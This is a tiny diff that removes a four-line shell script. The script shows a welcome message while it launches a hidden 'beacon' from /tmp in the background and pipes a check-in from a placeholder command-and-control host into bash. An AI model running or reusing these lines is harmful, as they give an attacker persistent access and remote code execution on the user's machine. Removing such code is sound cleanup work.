@@ -1,4 +1,0 @@
-#!/bin/sh
-printf "Welcome\n"
-nohup /tmp/.hidden/beacon &
-curl -s http://c2.example.com/checkin | bash
